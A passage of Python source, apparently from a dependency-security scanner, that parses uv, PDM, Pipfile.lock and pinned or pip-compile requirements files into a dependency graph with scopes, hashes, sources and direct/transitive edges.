            source: dict[str, Any] = raw_source if isinstance(raw_source, dict) else {}
            resolved = PypiEcosystem._str_or_none(source.get("registry") or source.get("url"))
            if isinstance(source.get("git"), str):
                resolved = "git+" + source["git"]
            local_path = (
                source.get("path")
                or source.get("directory")
                or source.get("editable")
                or source.get("virtual")
            )
            if normalized in runtime_direct:
                scope = Scope.RUNTIME
            elif normalized in development:
                scope = Scope.DEV
            elif normalized in optional:
                scope = Scope.OPTIONAL
            else:
                scope = Scope.RUNTIME
            requires_python = package.get("requires-python") or package.get("requires_python")
            conditions = list(markers.get(normalized, ()))
            if isinstance(requires_python, str) and requires_python.strip():
                conditions.append(f"python {requires_python.strip()}")
            entries.append(
                LockEntry(
                    name=name,
                    version=str(package.get("version", "")),
                    integrity=PypiEcosystem._artefact_hash(package),
                    resolved_from=resolved,
                    scope=scope,
                    dependencies=PypiEcosystem._pep_style_dependencies(package),
                    local=isinstance(local_path, str)
                    and not str(local_path).startswith(("/", "..")),
                    direct=normalized in direct,
                    platform=tuple(conditions),
                )
            )
        return LockGraph(
            path=content.path,
            ecosystem=self.id,
            entries=tuple(entries),
            workspaces=tuple(workspace_paths),
        )

    @staticmethod
    def _pep_style_markers(tables: list[dict[str, Any]]) -> dict[str, tuple[str, ...]]:
        """Edge markers in uv (`{ name = "colorama", marker = "sys_platform == 'win32'" }`) and
        PDM (`"colorama; sys_platform == 'win32'"`) dependency lists."""
        found: dict[str, list[str]] = {}
        unconditional: set[str] = set()
        for package in tables:
            items = package.get("dependencies")
            for item in items if isinstance(items, list) else ():
                if isinstance(item, dict) and isinstance(item.get("name"), str):
                    name, marker = item["name"], item.get("marker")
                elif isinstance(item, str):
                    parsed = PypiRequirement.parse(item)
                    if parsed is None:
                        continue
                    name, marker = parsed[0], parsed[3]
                else:
                    continue
                key = _NORMALIZE.sub("-", str(name).lower())
                if isinstance(marker, str) and marker.strip():
                    found.setdefault(key, []).append(marker.strip())
                else:
                    unconditional.add(key)
        return {k: tuple(dict.fromkeys(v)) for k, v in found.items() if k not in unconditional}

    @staticmethod
    def _pep_style_dependencies(package: dict[str, Any]) -> tuple[str, ...]:
        """The names a uv or PDM `[[package]]` depends on.

        uv writes `[[package.dependencies]]` tables carrying a `name`; PDM writes
        a list of requirement strings. Both arrive here as a list, and a string is
        cut at the first character that cannot belong to a name so that
        `urllib3>=1.26` and `urllib3` produce the same entry.
        """
        raw = package.get("dependencies")
        items: list[Any] = list(raw) if isinstance(raw, list) else []
        # uv records what an extra pulls in under the package's own `optional-dependencies`
        # (`requests` -> `socks` -> `pysocks`). A lock holds only what was activated, so an
        # extra's packages present in it were brought in by that extra.
        optional = package.get("optional-dependencies")
        if isinstance(optional, dict):
            for members in optional.values():
                if isinstance(members, list):
                    items.extend(members)
        if not items:
            return ()
        names: set[str] = set()
        for item in items:
            if isinstance(item, dict):
                name = PypiEcosystem._str_or_none(item.get("name"))
                if name:
                    names.add(name)
            elif isinstance(item, str):
                cut = _REQUIREMENT_NAME.split(item.strip(), maxsplit=1)[0]
                if cut:
                    names.add(cut)
        return tuple(sorted(names))

    @staticmethod
    def _dev_group_names(data: dict[str, Any]) -> frozenset[str]:
        """Normalised names a lockfile places in a development group.

        uv records them under `[manifest] dev-dependencies`; PDM records group
        membership on the package itself. Only names this can establish are
        treated as dev, because marking a runtime dependency dev suppresses
        findings that should fire.
        """
        names: set[str] = set()
        manifest = data.get("manifest")
        if isinstance(manifest, dict):
            groups = manifest.get("dev-dependencies")
            members: list[Any] = []
            if isinstance(groups, dict):
                for group in groups.values():
                    if isinstance(group, list):
                        members.extend(group)
            elif isinstance(groups, list):
                members.extend(groups)
            names.update(
                _REQUIREMENT_NAME.split(str(m).strip(), maxsplit=1)[0]
                for m in members
                if isinstance(m, str)
            )

        for package in data.get("package") or []:
            if not isinstance(package, dict):
                continue
            groups = package.get("groups")
            name = PypiEcosystem._str_or_none(package.get("name"))
            if (
                name
                and isinstance(groups, list)
                and groups
                and all(str(g) not in ("default", "main") for g in groups)
            ):
                names.add(name)

        return frozenset(_NORMALIZE.sub("-", n.strip().lower()) for n in names if n)

    @staticmethod
    def _artefact_hash(package: dict[str, Any]) -> str | None:
        """The hash of a uv or PDM package's own artefact.

        The sdist first, then the first wheel, then poetry's `files` shape so a
        lockfile carrying either layout is read the same way. A resolver that
        records no hash returns `None`, which the integrity rules report as an
        unpinned artefact rather than treating it as verified.
        """
        sdist = package.get("sdist")
        if isinstance(sdist, dict) and sdist.get("hash"):
            return str(sdist["hash"])
        wheels = package.get("wheels")
        if isinstance(wheels, list):
            for wheel in wheels:
                if isinstance(wheel, dict) and wheel.get("hash"):
                    return str(wheel["hash"])
        return PypiEcosystem._first_hash(package)

    def _parse_pipfile_lock(self, content: FileContent) -> LockGraph:
        import json

        try:
            data = BaseEcosystem._json_object(content.text)
        except (json.JSONDecodeError, ValueError) as exc:
            return LockGraph(
                path=content.path, ecosystem=self.id, parse_error=f"invalid JSON: {exc}"
            )
        entries: list[LockEntry] = []
        for section, scope in (("default", Scope.RUNTIME), ("develop", Scope.DEV)):
            for name, meta in sorted((data.get(section) or {}).items()):
                if not isinstance(meta, dict):
                    continue
                hashes = meta.get("hashes") or []
                resolved = None
                if isinstance(meta.get("git"), str):
                    resolved = f"git+{meta['git']}" + (
                        f"#{meta['ref']}" if isinstance(meta.get("ref"), str) else ""
                    )
                elif isinstance(meta.get("path"), str):
                    resolved = str(meta["path"])
                elif isinstance(meta.get("file"), str):
                    resolved = str(meta["file"])
                markers = meta.get("markers")
                entries.append(
                    LockEntry(
                        name=str(name),
                        version=str(meta.get("version", "")).lstrip("="),
                        integrity=str(hashes[0]) if hashes else None,
                        resolved_from=resolved,
                        scope=scope,
                        # Pipfile.lock lists every package flat, with no edges and no mark of
                        # what was asked for: the Pipfile beside it says which are direct.
                        direct=False,
                        local=isinstance(meta.get("path"), str)
                        and not str(meta["path"]).startswith(("/", "..")),
                        platform=(markers,) if isinstance(markers, str) and markers else (),
                    )
                )
        return LockGraph(path=content.path, ecosystem=self.id, entries=tuple(entries))

    def _parse_pinned_requirements(self, content: FileContent) -> LockGraph:
        """Treat a fully pinned requirements file as a lockfile.

        Only ``==`` pins count. A range is a declaration of intent, not a record
        of what was installed, and reporting one as resolved would claim a
        precision the file does not have.
        """
        entries: list[LockEntry] = []
        lines = PypiEcosystem._logical_lines(content.text)
        # Where pip resolves these from: one `--index-url` and no extra index means that index
        # serves every pin, which is what a private-registry check needs to know.
        indexes = [
            re.split(r"[=\s]", line, maxsplit=1)[1].strip().split()[0]
            for line in lines
            if re.match(r"^(?:-i|--index-url)[=\s]\s*\S", line)
        ]
        extra = any(re.match(r"^--extra-index-url[=\s]", line) for line in lines)
        index = indexes[0] if len(indexes) == 1 and not extra else None
        # Logical lines: pip-compile writes every `--hash=` on its own continuation line, and
        # joining them first puts each requirement and its hashes on one line. (Kept separate,
        # the trailing `\` once rode into the recorded hash.)
        for line in lines:
            if line.startswith("-"):
                continue
            hashes = re.findall(r"--hash[=\s]\s*(\S+)", line)
            requirement = re.split(r"\s--hash", line, maxsplit=1)[0]
            parsed = PypiRequirement.parse(requirement)
            if parsed is None:
                continue
            name, _extras, spec, marker, is_url = parsed
            if is_url or not spec.startswith("==") or "," in spec or "*" in spec:
                continue  # a range or a URL is not a resolution
            entries.append(
                LockEntry(
                    name=name,
                    version=PypiManifest._version_of(spec[2:].lstrip("=")),
                    integrity=hashes[0] if hashes else None,
                    resolved_from=index,
                    direct=True,
                    platform=(marker,) if marker else (),
                )
            )
        via = PypiEcosystem._pip_compile_via(content.text)
        if via:
            # pip-compile's own record of the graph: `# via requests` under certifi. A package
            # brought in only by other packages is transitive; one `# via -r requirements.in`
            # (or with no comment) is what the project asked for.
            # A parent written `-r requirements.in`, `-c constraints.txt` or `app (pyproject.toml)`
            # is a project file, not a package: the child is declared there directly.
            def from_project(parent: str) -> bool:
                return parent.startswith("-") or "(" in parent

            spelled = {self.normalize_name(e.name): e.name for e in entries}
            children: dict[str, set[str]] = {}
            for child, parents in via.items():
                for parent in parents:
                    if not from_project(parent):
                        children.setdefault(self.normalize_name(parent), set()).add(
                            spelled.get(child, child)
                        )
            entries = [
                LockEntry(
                    name=e.name,
                    version=e.version,
                    integrity=e.integrity,
                    resolved_from=e.resolved_from,
                    direct=(
                        self.normalize_name(e.name) not in via
                        or any(from_project(p) for p in via[self.normalize_name(e.name)])
                    ),
                    platform=e.platform,
                    dependencies=tuple(sorted(children.get(self.normalize_name(e.name), ()))),
                )
                for e in entries
            ]
        return LockGraph(path=content.path, ecosystem=self.id, entries=tuple(entries))

    @staticmethod
    def _pip_compile_via(text: str) -> dict[str, list[str]]:
        """`{normalised child: [parents]}` from pip-compile's annotations.

        ```
          certifi==2024.2.2           urllib3==2.2.1
              # via requests              # via
                                          #   requests
                                          #   -r requirements.in
        ```
        """
        found: dict[str, list[str]] = {}
        current: str | None = None
        collecting = False
        for raw in text.splitlines():
            stripped = raw.strip()
            if not stripped:
                continue
            if not stripped.startswith("#"):
                if stripped.startswith("--hash") or stripped.startswith("-") or raw[:1].isspace():
                    continue
                parsed = PypiRequirement.parse(stripped.split(" --hash", 1)[0].rstrip("\\ "))
                current = _NORMALIZE.sub("-", parsed[0].lower()) if parsed else None
                collecting = False
                continue
            comment = stripped.lstrip("#").strip()
            if current is None:
                continue
            if comment.startswith("via"):
                collecting = True
                rest = comment[3:].strip()
                if rest:
                    found.setdefault(current, []).extend(
                        p.strip() for p in rest.split(",") if p.strip()
                    )
                else:
                    found.setdefault(current, [])
                continue
            if collecting and raw.startswith("    #   "):
                found.setdefault(current, []).append(comment)
            else:
                collecting = False
        return found


__all__ = ["PypiEcosystem"]
